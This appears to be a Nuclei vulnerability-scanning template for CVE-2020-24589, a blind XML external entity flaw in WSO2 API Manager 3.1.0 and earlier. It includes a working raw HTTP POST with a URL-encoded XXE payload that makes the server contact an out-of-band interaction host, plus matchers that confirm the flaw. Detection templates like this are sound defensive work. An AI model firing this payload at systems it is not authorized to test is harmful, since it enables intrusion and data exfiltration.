id: CVE-2020-24589
info:
  name: WSO2 API Manager <=3.1.0 - Blind XML External Entity Injection
  author: lethargynavigator
  severity: critical
  description: The WSO2 API Manager <=3.1.0 is vulnerable to blind XML external entity
    injection, allowing an attacker to access files on the server and transmit sensitive
    data to a system they control.
  reference:
  - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742
  - https://nvd.nist.gov/vuln/detail/CVE-2020-24589
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
    cvss-score: 9.1
    cve-id: CVE-2020-24589
  tags: cve,cve2020,wso2,xxe,oast,blind
  metadata:
    impact: The blind XML external entity injection vulnerability in WSO2 API Manager
      3.1.0 and earlier can result in the compromise of sensitive data from the server
      to an external system controlled by the attacker.
    recommendation: It is recommended to upgrade to a version of WSO2 API Manager
      that is greater than 3.1.0 to mitigate the risk of blind XML external entity
      injection vulnerability (CVE-2020-24589).
requests:
- raw:
  - 'POST /carbon/generic/save_artifact_ajaxprocessor.jsp HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    payload=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+a+[+<!ENTITY+%25+xxe+SYSTEM+"http%3a//{{interactsh-url}}">%25xxe%3b]>

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: body
    words:
    - Failed to install the generic artifact type
